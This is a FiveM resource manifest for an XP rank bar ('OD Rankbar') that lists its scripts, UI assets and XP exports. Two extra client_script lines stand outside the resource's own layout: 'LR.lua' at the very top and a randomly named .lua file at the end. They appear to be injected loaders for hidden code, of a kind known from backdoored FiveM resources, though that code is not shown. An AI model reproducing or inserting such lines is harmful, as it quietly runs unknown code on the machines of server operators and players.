client_script 'LR.lua'
fx_version 'adamant'

game 'gta5'

description 'OD Rankbar'

version '1.2.0'

ui_page 'html/ui.html'

server_scripts {
  '@mysql-async/lib/MySQL.lua',
  'server/server.lua'
}

client_scripts {
  'client/client.lua'
}

files {
	'html/ui.html',
	'html/css/style.css',
	'html/fonts/UVNBaiSau_R.ttf',
	'html/js/script.js',
	'html/img/0.png',
	'html/img/1.png',
	'html/img/2.png',
	'html/img/3.png',
	'html/img/4.png',
	'html/img/5.png',
	'html/img/6.png',
	'html/img/7.png',
	'html/img/8.png',
	'html/img/9.png',
	'html/img/10.png',
}

export 'Exp_XNL_SetInitialXPLevels'
export 'Exp_XNL_AddPlayerXP'
export 'Exp_XNL_RemovePlayerXP'
export 'Exp_XNL_GetCurrentPlayerXP'
export 'Exp_XNL_GetLevelFromXP'
export 'Exp_XNL_GetCurrentPlayer'
export 'Exp_XNL_GetCurrentPlayerLevel'

client_script "GXMlllIvDDBXptFHlw.lua"